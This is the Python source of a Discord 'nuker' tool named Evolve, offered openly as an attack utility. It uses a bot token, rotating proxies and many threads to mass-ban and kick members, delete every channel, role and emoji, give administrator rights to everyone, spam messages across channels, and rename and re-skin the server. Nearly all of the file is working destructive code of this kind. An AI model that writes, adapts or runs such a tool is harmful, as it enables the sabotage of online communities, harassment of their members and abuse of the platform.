import threading, webbrowser, discord, random, httpx, json, time, os, base64
from discord.ext import commands
from itertools import cycle

VERSION = '2.0.0'

__intents__ = discord.Intents.default()
__intents__.members = True
__intents__.bans = True
__proxies__, __client__, __config__, __threads__ = cycle(open("proxies.txt", "r").read().splitlines()), commands.Bot(command_prefix="+", help_command=None, intents=__intents__), json.load(open("config.json", "r", encoding="utf-8")), 45
token = __config__["token"]
os.system("cls") if os.name == "nt" else os.system("clear")

Evolve_art = """\x1b[38;5;196m]▄▄▄▖▄   ▄  ▄▄▄  █ ▄   ▄ ▗▞▀▚▖
▐▌   █   █ █   █ █ █   █ ▐▛▀▀▘
▐▛▀▀▘ ▀▄▀  ▀▄▄▄▀ █  ▀▄▀  ▝▚▄▄▖
▐▙▄▄▖            █            
                              
MADE BY Vampire .GG/AFKOP 
\x1b[0m"""
options = """
 ╔╦╝
     ╔═════╩══════════════════╦═════════════════════════╦══════════════════╩═════╗
     ╩ 
({}1{}) < {}Massban Members     
({}2{}) < {}MassKick Members   
({}3{}) < {}Prune Members
({}4{}) < {}MassCreate Channels
({}5{}) < {}Exit
({}6{}) < {}MassRoles      
({}7{}) < {}Mass Delete Channels   
({}8{}) < {}Mass Delete Roles 
({}9{}) < {}MassDelete Emojis
({}10{}) < {}Support
({}11{}) < {}Webhook Spam
({}12{}) < {}Check For Updz    
({}13{}) < {}Admin All
({}14{}) < {}Mass Unban All    
({}15{}) < {}Change Guild Name
({}16{}) < {}Mass Role Assign
({}17{}) < {}Guild Icon Change
({}18{}) < {}Security Bypass Coming Soon   ({}19{}) < {}Vanity Snipe Coming Soon           
     ╚═════╦══════════════════╩═════════════════════════╩══════════════════╦═════╝
          ╔╩╝"""                                                             
print(options)
class Evolve:
    def __init__(self):
        self.proxy = "http://" + next(__proxies__) if __config__["proxy"] == True else None
        self.session = httpx.Client(transport=httpx.HTTPTransport(proxy=self.proxy))
        self.version = cycle(['v10', 'v9'])
        self.banned = []
        self.kicked = []
        self.channels = []
        self.roles = []
        self.emojis = []
        self.messages = []
        self.unbanned = []
        self.assigned_roles = []

    def execute_ban(self, guildid: str, member: str, token: str):
        payload = {
            "delete_message_days": random.randint(0, 7)
            # Other dictionary items...
        }
        while True:
            response = self.session.put(f"https://discord.com/api/{next(self.version)}/guilds/{guildid}/bans/{member}", headers={"Authorization": f"Bot {token}"}, json=payload)
            if response.status_code in [200, 201, 204]:
                print("{}({}+{}) MassBanned {}{}".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m", "\x1b[38;5;196m", member))
                self.banned.append(member)
                break
            elif "retry_after" in response.text:
                time.sleep(response.json()['retry_after'])
            elif "Missing Permissions" in response.text:
                print("{}({}!{}) Missing Permissions {}{}".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m", "\x1b[38;5;196m", member))
                break
            elif "You are being blocked from accessing our API temporarily due to exceeding our rate limits frequently." in response.text:
                print("{}({}!{}) You're being excluded from discord API".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m"))
                break
            elif "Max number of massbans for non-guild members have been exceeded." in response.text:
                print("{}({}!{}) Max number of bans for non-guild members have been exceeded".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m"))
                break
            else:
                print("{}({}-{}) Failed to ban {}{}".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m", "\x1b[38;5;196m", member))
                break

    def execute_kick(self, guildid: str, member: str, token: str):
        while True:
            response = self.session.delete(f"https://discord.com/api/{next(self.version)}/guilds/{guildid}/members/{member}", headers={"Authorization": f"Bot {token}"})
            if response.status_code in [200, 201, 204]:
                print("{}({}+{}) Kicked {}{}".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m", "\x1b[38;5;196m", member))
                self.kicked.append(member)
                break
            elif "retry_after" in response.text:
                print("{}({}!{}) Ratelimited. Delayed {}{}{}s".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m", "\x1b[38;5;196m", response.json()['retry_after'], "\x1b[0m"))
                time.sleep(float(response.json()['retry_after']))
            elif "Missing Permissions" in response.text:
                print("{}({}!{}) Missing Permissions {}{}".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m", "\x1b[38;5;196m", member))
                break
            elif "You are being blocked from accessing our API temporarily due to exceeding our rate limits frequently." in response.text:
                print("{}({}!{}) You're being excluded from discord API".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m"))
                break
            else:
                print("{}({}-{}) Failed to kick {}{}".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m", "\x1b[38;5;196m", member))
                break

    def execute_prune(self, guildid: str, days: int, token: str):
        payload = {
            "days": days
        }
        response = self.session.post(f"https://discord.com/api/v9/guilds/{guildid}/prune", headers={"Authorization": f"Bot {token}"}, json=payload)
        if response.status_code == 200:
            print("{}({}+{}) Pruned {}{}{} members".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m", "\x1b[38;5;196m", response.json()['pruned'], "\x1b[0m"))
        elif "Max number of prune requests has been reached. Try again later" in response.text:
            print("{}({}!{}) Max number of prune reached. Try again in {}s".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m", response.json()['retry_after']))
        elif "You are being blocked from accessing our API temporarily due to exceeding our rate limits frequently." in response.text:
            print("{}({}!{}) You're being temporarily excluded from discord API".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m"))
        else:
            print("{}({}-{}) Failed to prune {}{}".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m", "\x1b[38;5;196m", guildid))

    def execute_crechannels(self, guildid: str, channelsname: str, type: int, token: str):
        payload = {
            "type": type,
            "name": channelsname,
            "permission_overwrites": []
        }
        channelsname = channelsname.replace(" ", "-")
        while True:
            response = self.session.post(f"https://discord.com/api/{next(self.version)}/guilds/{guildid}/channels", headers={"Authorization": f"Bot {token}"}, json=payload)
            if response.status_code == 201:
                print("{}({}+{}) Created {}#{}".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m", "\x1b[38;5;196m", channelsname))
                self.channels.append(1)
                break
            elif "retry_after" in response.text:
                print("{}({}!{}) Ratelimited. Delayed {}{}{}s".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m", "\x1b[38;5;196m", response.json()['retry_after'], "\x1b[0m"))
                time.sleep(float(response.json()['retry_after']))
            elif "Missing Permissions" in response.text:
                print("{}({}!{}) Missing Permissions {}#{}".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m", "\x1b[38;5;196m", channelsname))
                break
            elif "You are being blocked from accessing our API temporarily due to exceeding our rate limits frequently." in response.text:
                print("{}({}!{}) You're being temporarily excluded from discord API".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m"))
                break
            else:
                print("{}({}-{}) Failed to create {}#{}".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m", "\x1b[38;5;196m", channelsname))
                break

    def execute_creroles(self, guildid: str, rolesname: str, token: str):
        colors = random.choice([0x0000FF, 0xFF0000, 0xFF0000, 0xFF0000, 0xFF0000, 0xFF0000, 0xFF0000, 0xFF0000, 0xFF0000, 0xFF0000, 0xFF0000, 0xFF0000, 0xFF0000, 0xFF0000, 0xFF0000])
        payload = {
            "name": rolesname,
            "color": colors
        }
        while True:
            response = self.session.post(f"https://discord.com/api/{next(self.version)}/guilds/{guildid}/roles", headers={"Authorization": f"Bot {token}"}, json=payload)
            if response.status_code == 200:
                print("{}({}+{}) Created {}@{}".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m", "\x1b[38;5;196m", rolesname))
                self.roles.append(1)
                break
            elif "retry_after" in response.text:
                print("{}({}!{}) Ratelimited. Delayed {}{}{}s".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m", "\x1b[38;5;196m", response.json()['retry_after'], "\x1b[0m"))
                time.sleep(float(response.json()['retry_after']))
            elif "Missing Permissions" in response.text:
                print("{}({}!{}) Missing Permissions {}@{}".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m", "\x1b[38;5;196m", rolesname))
                break
            elif "You are being blocked from accessing our API temporarily due to exceeding our rate limits frequently." in response.text:
                print("{}({}!{}) You're being temporarily excluded from discord API".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m"))
                break
            else:
                print("{}({}-{}) Failed to create {}@{}".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m", "\x1b[38;5;196m", rolesname))
                break

    def execute_delchannels(self, channel: str, token: str):
        while True:
            response = self.session.delete(f"https://discord.com/api/{next(self.version)}/channels/{channel}", headers={"Authorization": f"Bot {token}"})
            if response.status_code == 200:
                print("{}({}+{}) Deleted {}{}".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m", "\x1b[38;5;196m", channel))
                self.channels.append(channel)
                break
            elif "retry_after" in response.text:
                print("{}({}!{}) Ratelimited. Delayed {}{}{}s".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m", "\x1b[38;5;196m", response.json()['retry_after'], "\x1b[0m"))
                time.sleep(float(response.json()['retry_after']))
            elif "Missing Permissions" in response.text:
                print("{}({}!{}) Missing Permissions {}{}".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m", "\x1b[38;5;196m", channel))
                break
            elif "You are being blocked from accessing our API temporarily due to exceeding our rate limits frequently." in response.text:
                print("{}({}!{}) You're being temporarily excluded from discord API".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m"))
                break
            else:
                print("{}({}-{}) Failed to delete {}{}".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m", "\x1b[38;5;196m", channel))
                break

    def execute_delroles(self, guildid: str, role: str, token: str):
        while True:
            response = self.session.delete(f"https://discord.com/api/{next(self.version)}/guilds/{guildid}/roles/{role}", headers={"Authorization": f"Bot {token}"})
            if response.status_code == 204:
                print("{}({}+{}) Deleted {}{}".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m", "\x1b[38;5;196m", role))
                self.roles.append(role)
                break
            elif "retry_after" in response.text:
                print("{}({}!{}) Ratelimited. Delayed {}{}{}s".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m", "\x1b[38;5;196m", response.json()['retry_after'], "\x1b[0m"))
                time.sleep(float(response.json()['retry_after']))
            elif "Missing Permissions" in response.text:
                print("{}({}!{}) Missing Permissions {}{}".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m", "\x1b[38;5;196m", role))
                break
            elif "You are being blocked from accessing our API temporarily due to exceeding our rate limits frequently." in response.text:
                print("{}({}!{}) You're being temporarily excluded from discord API".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m"))
                break
            else:
                print("{}({}-{}) Failed to delete {}{}".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m", "\x1b[38;5;196m", role))
                break

    def execute_delemojis(self, guildid: str, emoji: str, token: str):
        while True:
            response = self.session.delete(f"https://discord.com/api/{next(self.version)}/guilds/{guildid}/emojis/{emoji}", headers={"Authorization": f"Bot {token}"})
            if response.status_code == 204:
                print("{}({}+{}) Deleted {}{}".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m", "\x1b[38;5;196m", emoji))
                self.emojis.append(emoji)
                break
            elif "retry_after" in response.text:
                print("{}({}!{}) Ratelimited. Delayed {}{}{}s".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m", "\x1b[38;5;196m", response.json()['retry_after'], "\x1b[0m"))
                time.sleep(float(response.json()['retry_after']))
            elif "Missing Permissions" in response.text:
                print("{}({}!{}) Missing Permissions {}{}".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m", "\x1b[38;5;196m", emoji))
                break
            elif "You are being blocked from accessing our API temporarily due to exceeding our rate limits frequently." in response.text:
                print("{}({}!{}) You're being temporarily excluded from discord API".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m"))
                break
            else:
                print("{}({}-{}) Failed to delete {}{}".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m", "\x1b[38;5;196m", emoji))
                break

    def execute_massping(self, channel: str, content: str, token: str):
        while True:
            response = self.session.post(f"https://discord.com/api/{next(self.version)}/channels/{channel}/messages", headers={"Authorization": f"Bot {token}"}, json={"content": content})
            if response.status_code == 200:
                print("{}({}+{}) Spammed {}{}{} in {}{}".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m", "\x1b[38;5;196m", content, "\x1b[0m", "\x1b[38;5;196m", channel))
                self.messages.append(channel)
                break
            elif "retry_after" in response.text:
                print("{}({}!{}) Ratelimited. Delayed {}{}{}s".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m", "\x1b[38;5;196m", response.json()['retry_after'], "\x1b[0m"))
                time.sleep(float(response.json()['retry_after']))
            elif "Missing Permissions" in response.text:
                print("{}({}!{}) Missing Permissions {}{}".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m", "\x1b[38;5;196m", channel))
                break
            elif "You are being blocked from accessing our API temporarily due to exceeding our rate limits frequently." in response.text:
                print("{}({}!{}) You're being temporarily excluded from discord API".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m"))
                break
            else:
                print("{}({}-{}) Failed to spam {}{}".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m", "\x1b[38;5;196m", channel))
                break

    def execute_admin_all(self, guildid: str, token: str):
        payload = {
            "permissions": "8"
        }
        while True:
            response = self.session.patch(f"https://discord.com/api/{next(self.version)}/guilds/{guildid}/roles/{guildid}", headers={"Authorization": f"Bot {token}"}, json=payload)
            if response.status_code in [200, 204]:
                print("{}({}+{}) Granted admin to everyone role".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m"))
                break
            elif "retry_after" in response.text:
                print("{}({}!{}) Ratelimited. Delayed {}{}{}s".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m", "\x1b[38;5;196m", response.json()['retry_after'], "\x1b[0m"))
                time.sleep(float(response.json()['retry_after']))
            elif "Missing Permissions" in response.text:
                print("{}({}!{}) Missing Permissions for everyone role".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m"))
                break
            elif "You are being blocked from accessing our API temporarily due to exceeding our rate limits frequently." in response.text:
                print("{}({}!{}) You're being temporarily excluded from discord API".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m"))
                break
            else:
                print("{}({}-{}) Failed to grant admin to everyone role".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m"))
                break

    def execute_change_guild_name(self, guildid: str, new_name: str, token: str):
        payload = {
            "name": new_name
        }
        while True:
            response = self.session.patch(f"https://discord.com/api/{next(self.version)}/guilds/{guildid}", headers={"Authorization": f"Bot {token}"}, json=payload)
            if response.status_code in [200, 204]:
                print("{}({}+{}) Changed guild name to {}{}".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m", "\x1b[38;5;196m", new_name))
                break
            elif "retry_after" in response.text:
                print("{}({}!{}) Ratelimited. Delayed {}{}{}s".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m", "\x1b[38;5;196m", response.json()['retry_after'], "\x1b[0m"))
                time.sleep(float(response.json()['retry_after']))
            elif "Missing Permissions" in response.text:
                print("{}({}!{}) Missing Permissions to change guild name".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m"))
                break
            elif "You are being blocked from accessing our API temporarily due to exceeding our rate limits frequently." in response.text:
                print("{}({}!{}) You're being temporarily excluded from discord API".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m"))
                break
            else:
                print("{}({}-{}) Failed to change guild name to {}{}".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m", "\x1b[38;5;196m", new_name))
                break

    def execute_unban(self, guildid: str, user_id: str, token: str):
        while True:
            response = self.session.delete(f"https://discord.com/api/{next(self.version)}/guilds/{guildid}/bans/{user_id}", headers={"Authorization": f"Bot {token}"})
            if response.status_code in [200, 204]:
                print("{}({}+{}) Unbanned {}{}".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m", "\x1b[38;5;196m", user_id))
                self.unbanned.append(user_id)
                break
            elif "retry_after" in response.text:
                print("{}({}!{}) Ratelimited. Delayed {}{}{}s".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m", "\x1b[38;5;196m", response.json()['retry_after'], "\x1b[0m"))
                time.sleep(float(response.json()['retry_after']))
            elif "Missing Permissions" in response.text:
                print("{}({}!{}) Missing Permissions to unban {}{}".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m", "\x1b[38;5;196m", user_id))
                break
            elif "You are being blocked from accessing our API temporarily due to exceeding our rate limits frequently." in response.text:
                print("{}({}!{}) You're being temporarily excluded from discord API".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m"))
                break
            else:
                print("{}({}-{}) Failed to unban {}{}".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m", "\x1b[38;5;196m", user_id))
                break

    def execute_mass_role_assign(self, guildid: str, role_id: str, token: str):
        members = open("members.txt", "r").read().splitlines()
        for member in members:
            while True:
                response = self.session.put(f"https://discord.com/api/{next(self.version)}/guilds/{guildid}/members/{member}/roles/{role_id}", headers={"Authorization": f"Bot {token}"})
                if response.status_code in [200, 204]:
                    print("{}({}+{}) Assigned role {} to {}{}".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m", "\x1b[38;5;196m", member))
                    self.assigned_roles.append(member)
                    break
                elif "retry_after" in response.text:
                    print("{}({}!{}) Ratelimited. Delayed {}{}{}s".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m", "\x1b[38;5;196m", response.json()['retry_after'], "\x1b[0m"))
                    time.sleep(float(response.json()['retry_after']))
                elif "Missing Permissions" in response.text:
                    print("{}({}!{}) Missing Permissions to assign role to {}{}".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m", "\x1b[38;5;196m", member))
                    break
                elif "You are being blocked from accessing our API temporarily due to exceeding our rate limits frequently." in response.text:
                    print("{}({}!{}) You're being temporarily excluded from discord API".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m"))
                    break
                else:
                    print("{}({}-{}) Failed to assign role to {}{}".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m", "\x1b[38;5;196m", member))
                    break

    def execute_guild_icon_change(self, guildid: str, icon_data: str, token: str):
        payload = {
            "icon": icon_data
        }
        while True:
            response = self.session.patch(f"https://discord.com/api/{next(self.version)}/guilds/{guildid}", headers={"Authorization": f"Bot {token}"}, json=payload)
            if response.status_code in [200, 204]:
                print("{}({}+{}) Changed guild icon".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m"))
                break
            elif "retry_after" in response.text:
                print("{}({}!{}) Ratelimited. Delayed {}{}{}s".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m", "\x1b[38;5;196m", response.json()['retry_after'], "\x1b[0m"))
                time.sleep(float(response.json()['retry_after']))
            elif "Missing Permissions" in response.text:
                print("{}({}!{}) Missing Permissions to change guild icon".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m"))
                break
            elif "You are being blocked from accessing our API temporarily due to exceeding our rate limits frequently." in response.text:
                print("{}({}!{}) You're being temporarily excluded from discord API".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m"))
                break
            else:
                print("{}({}-{}) Failed to change guild icon".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m"))
                break

    def menu(self):
        os.system(f"cls & title Evolve ^| Authenticated as: {__client__.user.name}#{__client__.user.discriminator}")
        print(Evolve_art + options + "\n")
        ans = input("{}({}Evolve{}) Option{}:{} ".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m", "\x1b[38;5;196m", "\x1b[0m"))

        if ans in ["1", "01"]:
            scrape = input("{}({}Evolve{}) Fetch IDs [Y/N]{}:{} ".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m", "\x1b[38;5;196m", "\x1b[0m"))
            if scrape.lower() == "y":
                try:
                    guild = __client__.get_guild(int(guildid))
                    with open("members.txt", "w") as a:
                        for member in guild.members:
                            a.write("{}{}".format(member.id, "\n"))
                except:
                    pass
            self.banned.clear()
            members = open("members.txt", "r").read().splitlines()
            for member in members:
                t = threading.Thread(target=self.execute_ban, args=(guildid, member, token))
                t.start()
                while threading.active_count() >= __threads__:
                    t.join()
            time.sleep(3)
            print("{}({}Evolve{}) Banned {}/{}".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m", len(self.banned), len(members)))
            time.sleep(1.5)
            self.menu()

        elif ans in ["2", "02"]:
            self.kicked.clear()
            members = open("fetched/members.txt", "r").read().splitlines()
            for member in members:
                t = threading.Thread(target=self.execute_kick, args=(guildid, member, token))
                t.start()
                while threading.active_count() >= __threads__:
                    t.join()
            time.sleep(3)
            print("{}({}Evolve{}) Kicked {}/{}".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m", len(self.kicked), len(members)))
            time.sleep(1.5)
            self.menu()

        elif ans in ["3", "03"]:
            days = int(input("{}({}Evolve{}) Days{}:{} ".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m", "\x1b[38;5;196m", "\x1b[0m")))
            self.execute_prune(guildid, days, token)
            time.sleep(1.5)
            self.menu()

        elif ans in ["4", "04"]:
            type = input("{}({}Evolve{}) Channels Type ['t', 'v']{}:{} ".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m", "\x1b[38;5;196m", "\x1b[0m"))
            type = 2 if type == "v" else 0
            amount = int(input("{}({}Evolve{}) Amount{}:{} ".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m", "\x1b[38;5;196m", "\x1b[0m")))
            self.channels.clear()
            for i in range(amount):
                t = threading.Thread(target=self.execute_crechannels, args=(guildid, random.choice(__config__["nuke"]["channels_name"]), type, token))
                t.start()
                while threading.active_count() >= __threads__:
                    t.join()
            time.sleep(3)
            print("{}({}Evolve{}) Created {}/{} channels".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m", len(self.channels), amount))
            time.sleep(1.5)
            self.menu()

        elif ans in ["5", "05"]:
            print("{}({}Evolve{}) Thanks for using Evolve!".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m"))
            time.sleep(1.5)
            os._exit(0)

        elif ans in ["6", "06"]:
            amount = int(input("{}({}Evolve{}) Amount{}:{} ".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m", "\x1b[38;5;196m", "\x1b[0m")))
            self.roles.clear()
            for i in range(amount):
                t = threading.Thread(target=self.execute_creroles, args=(guildid, random.choice(__config__["nuke"]["roles_name"]), token))
                t.start()
                while threading.active_count() >= __threads__:
                    t.join()
            time.sleep(3)
            print("{}({}Evolve{}) Created {}/{} roles".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m", len(self.roles), amount))
            time.sleep(1.5)
            self.menu()

        elif ans in ["7", "07"]:
            self.channels.clear()
            channels = self.session.get(f"https://discord.com/api/v9/guilds/{guildid}/channels", headers={"Authorization": f"Bot {token}"}).json()
            for channel in channels:
                t = threading.Thread(target=self.execute_delchannels, args=(channel['id'], token))
                t.start()
                while threading.active_count() >= __threads__:
                    t.join()
            time.sleep(3)
            print("{}({}Evolve{}) Deleted {}/{} channels".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m", len(self.channels), len(channels)))
            time.sleep(1.5)
            self.menu()

        elif ans in ["8", "08"]:
            self.roles.clear()
            roles = self.session.get(f"https://discord.com/api/v9/guilds/{guildid}/roles", headers={"Authorization": f"Bot {token}"}).json()
            for role in roles:
                t = threading.Thread(target=self.execute_delroles, args=(guildid, role['id'], token))
                t.start()
                while threading.active_count() >= __threads__:
                    t.join()
            time.sleep(3)
            print("{}({}Evolve{}) Deleted {}/{} roles".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m", len(self.roles), len(roles)))
            time.sleep(1.5)
            self.menu()

        elif ans in ["9", "09"]:
            self.emojis.clear()
            emojis = self.session.get(f"https://discord.com/api/v9/guilds/{guildid}/emojis", headers={"Authorization": f"Bot {token}"}).json()
            for emoji in emojis:
                t = threading.Thread(target=self.execute_delemojis, args=(guildid, emoji['id'], token))
                t.start()
                while threading.active_count() >= __threads__:
                    t.join()
            time.sleep(3)
            print("{}({}Evolve{}) Deleted {}/{} emojis".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m", len(self.emojis), len(emojis)))
            time.sleep(1.5)
            self.menu()

        elif ans in ["10", "10"]:
            print("- Evolve Nuker Made By _1nonlyvampire This Is Not A Skid Because I Gave Credits To Hellium Nuker For Support Join discord.gg/afkop")
            input("")
            self.menu()

        elif ans in ["11", "11"]:
            self.messages.clear()
            self.channels.clear()
            amount = int(input("{}({}Evolve{}) Amount{}:{} ".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m", "\x1b[38;5;196m", "\x1b[0m")))
            channels = self.session.get(f"https://discord.com/api/v9/guilds/{guildid}/channels", headers={"Authorization": f"Bot {token}"}).json()
            for channel in channels:
                self.channels.append(channel['id'])
            channelz = cycle(self.channels)
            for i in range(amount):
                t = threading.Thread(target=self.execute_massping, args=(next(channelz), random.choice(__config__["nuke"]["messages_content"]), token))
                t.start()
                while threading.active_count() >= __threads__ - 15:
                    t.join()
            time.sleep(3)
            print("{}({}Evolve{}) Spammed {}/{} messages".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m", len(self.messages), amount))
            time.sleep(1.5)
            self.menu()

        elif ans in ["12", "12"]:
            try:
                response = self.session.get("")
                check_version = response.headers.get('location').split('/')[7].split('v')[1]
                if VERSION != check_version:
                    print("{}({}Evolve{}) You're using an outdated version!".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m"))
                    webbrowser.open(f"")
                else:
                    print("{}({}Evolve{}) You're using the current version!".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m"))
            except:
                print("{}({}Evolve{}) Couldn't reach the releases!".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m"))
            time.sleep(1.5)
            self.menu()

        elif ans in ["13", "13"]:
            self.execute_admin_all(guildid, token)
            time.sleep(1.5)
            self.menu()

        elif ans in ["14", "14"]:
            self.unbanned.clear()
            response = self.session.get(f"https://discord.com/api/v9/guilds/{guildid}/bans", headers={"Authorization": f"Bot {token}"})
            if response.status_code == 200:
                bans = response.json()
                for ban in bans:
                    user_id = ban['user']['id']
                    t = threading.Thread(target=self.execute_unban, args=(guildid, user_id, token))
                    t.start()
                    while threading.active_count() >= __threads__:
                        t.join()
                time.sleep(3)
                print("{}({}Evolve{}) Unbanned {}/{} users".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m", len(self.unbanned), len(bans)))
            else:
                print("{}({}-{}) Failed to fetch ban list".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m"))
            time.sleep(1.5)
            self.menu()

        elif ans in ["15", "15"]:
            new_name = input("{}({}Evolve{}) New Guild Name (leave blank for random){}:{} ".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m", "\x1b[38;5;196m", "\x1b[0m"))
            if not new_name.strip():
                new_name = random.choice(__config__.get("nuke", {}).get("guild_names", ["Evolve-Nuked"]))
            self.execute_change_guild_name(guildid, new_name, token)
            time.sleep(1.5)
            self.menu()

        elif ans in ["16", "16"]:
            scrape = input("{}({}Evolve{}) Fetch Member IDs [Y/N]{}:{} ".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m", "\x1b[38;5;196m", "\x1b[0m"))
            if scrape.lower() == "y":
                try:
                    guild = __client__.get_guild(int(guildid))
                    with open("members.txt", "w") as a:
                        for member in guild.members:
                            a.write("{}{}".format(member.id, "\n"))
                except:
                    pass
            role_id = input("{}({}Evolve{}) Role ID (leave blank for random){}:{} ".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m", "\x1b[38;5;196m", "\x1b[0m"))
            if not role_id.strip():
                roles = self.session.get(f"https://discord.com/api/v9/guilds/{guildid}/roles", headers={"Authorization": f"Bot {token}"}).json()
                role_id = random.choice([role['id'] for role in roles if role['id'] != guildid]) if roles else None
            if role_id:
                self.assigned_roles.clear()
                members = open("members.txt", "r").read().splitlines()
                for member in members:
                    t = threading.Thread(target=self.execute_mass_role_assign, args=(guildid, role_id, token))
                    t.start()
                    while threading.active_count() >= __threads__:
                        t.join()
                time.sleep(3)
                print("{}({}Evolve{}) Assigned role to {}/{} members".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m", len(self.assigned_roles), len(members)))
            else:
                print("{}({}-{}) No valid role found".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m"))
            time.sleep(1.5)
            self.menu()

        elif ans in ["17", "17"]:
            icon_path = __config__.get("nuke", {}).get("guild_icon", None)
            if icon_path and os.path.exists(icon_path):
                with open(icon_path, "rb") as f:
                    icon_data = f"data:image/jpeg;base64,{base64.b64encode(f.read()).decode('utf-8')}"
            else:
                icon_data = None
            self.execute_guild_icon_change(guildid, icon_data, token)
            time.sleep(1.5)
            self.menu()

@__client__.event
async def on_ready():
    print("{}({}Evolve{}) Authenticated as{}: {}{}".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m", "\x1b[38;5;196m", "\x1b[0m", f"{__client__.user.name}#{__client__.user.discriminator}"))
    time.sleep(1.5)
    Evolve().menu()

if __name__ == "__main__":
    try:
        os.system("title Evolve Nuker ^| Authentication & mode con: cols=95 lines=25")
        guildid = input("{}({}Evolve{}) Guild ID{}:{} ".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m", "\x1b[38;5;196m", "\x1b[0m"))
        __client__.run(token, bot=True)
    except Exception as e:
        print("{}({}-{}) {}".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m", e))
        time.sleep(1.5)
        os._exit(0)